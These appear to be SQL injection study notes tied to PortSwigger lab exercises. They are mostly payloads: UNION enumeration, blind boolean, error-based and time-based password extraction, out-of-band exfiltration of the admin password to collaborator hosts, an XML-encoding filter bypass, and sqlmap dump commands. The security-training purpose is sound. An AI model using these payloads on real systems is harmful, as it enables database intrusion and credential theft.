# SQL Injection

### Retrieving hidden data

`https://insecure-website.com/products?category=Gifts'--`

### Subverting application logic

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

## SQL injection UNION attacks

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Determining the number of columns required

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

### Database-specific syntax

**Oracle Based Databases**

```sql
' UNION SELECT NULL FROM DUAL--
```

### Finding columns with a useful data type

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving multiple values within a single column

`' UNION SELECT username || '~' || password FROM users--`

## Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Querying the database type and version

| Database type | Query |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |
| PostgreSQL | `SELECT version()` |

### Listing the contents of the database

| Oracle | `SELECT * FROM all_tables
 SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| --- | --- |
| Microsoft | `SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## Blind SQL injection

### **Exploiting blind SQL injection by triggering conditional responses**

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
```

[Blind SQL Injection Python Script](Scripts/Blind%20SQL%20Injection%20-%20MultiThreading%202de1135e7b528045b971ccd513568d7d.md)

### Error-based SQL injection

| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| --- | --- |
| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

#Microsoft
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

#Oracle
xyz' AND (SELECT (CASE WHEN (SUBSTR(password,1,1)='m') THEN TO_CHAR(1/0) ELSE 'a' END) FROM users WHERE username='administrator')='a
```

[Blind Error Based SQL Injection Python Script](Scripts/Blind%20Error%20Based%20SQL%20Injection%20-%20MultiThreading%202df1135e7b52809495c6d91804be56ed.md)

### Extracting sensitive data via verbose SQL error messages

| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT 'secret')
> Conversion failed when converting the varchar value 'secret' to data type int.` |
| --- | --- |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
> invalid input syntax for integer: "secret"` |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
> XPATH syntax error: '\secret'` |

```sql
#PostgreSQL
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### Blind SQL injection by triggering time delays

| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| --- | --- |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| --- | --- |
| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

```sql
#Microsoft
\'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

#PostgreSQL
\'; SELECT CASE WHEN (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 'm') = 1 THEN pg_sleep(7) ELSE pg_sleep(0) END-- -
```

[Blind Time Based SQL Injection Python Script](Scripts/Blind%20Time%20Based%20SQL%20Injection%20-%20MultiThreading%202df1135e7b5280638a3bc2edd6f47ef1.md)

### Blind SQL injection using out-of-band (OAST)

**DNS lookup**

| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml 
version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % 
remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> 
%remote;]>'),'/l') FROM dual`
The following technique works on fully patched Oracle installations, but requires elevated privileges:`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| --- | --- |
| Microsoft | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL | The following techniques work on Windows only:`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

```sql
#Microsoft
xyz'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

#Oracle
xyz' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

## SQL injection in different contexts

```xml
<?xml version="1.0" encoding="UTF-8"?> 
   <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
            <@hex_entities>
            UNION SELECT username||'+'||password FROM users
            <@/hex_entities>
        </storeId>
    </stockCheck>
```

## Second-order SQL injection

> NOTE Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.
> 

## Labs

[SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

[SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

[SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

[SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

[SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

[SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

[SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

`'UNION SELECT NULL,@@version-- -`

[SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

`'UNION SELECT null,banner from v$version-- -`

[SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

```sql
xzy\'UNION SELECT NULL,table_name FROM information_schema.tables-- -

xzy\'UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -

xzy\'UNION SELECT username,password FROM users-- -
```

[SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

```sql
xzy\'UNION SELECT table_name,NULL FROM all_tables-- -

xzy\'UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name= 'users'-- -

xzy\'UNION SELECT USERNAME,PASSWORD FROM USERS-- -
```

[Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

`sqlmap --url='<url>' -H "Cookie: TrackingId=*; session=ToTtT4jr5bAuueFll0ev7fU1KmKXo7r7" -p TrackingId --batch`

[Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

`sqlmap --url='<url>' -H "Cookie: TrackingId=xyz*; session=FAn8hWdjHczi9zuWJ4At8bavBE5f2nt" -p TrackingId --level=2 --batch`

[Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)—`

[Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

`sqlmap --url="<url>" -H "Cookie: TrackingId=xyz*; session=Qt4Hjm8lq2LkKLbGTMV9Cp5d90oAm2dP" -p 'TrackingId' --threads=10 --batch`

[Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

`'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual-- -`

[Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

`xyz'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.6lsn2zfhzqbecblflofy4tu4uv0modi17.oastify.com"> %ext; ]><root/>'),'/l') from dual)||'`

[SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

```xml
<?xml version="1.0" encoding="UTF-8"?>    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            1
            <@hex_entities>
            UNION SELECT username||'+'||password FROM users
            <@/hex_entities>
        </storeId>
    </stockCheck>
    
    
    
# SQLMAP
sqlmap -r req.txt --batch  --dump --risk=3 -p storeId --force-ssl --tamper=hexentities
```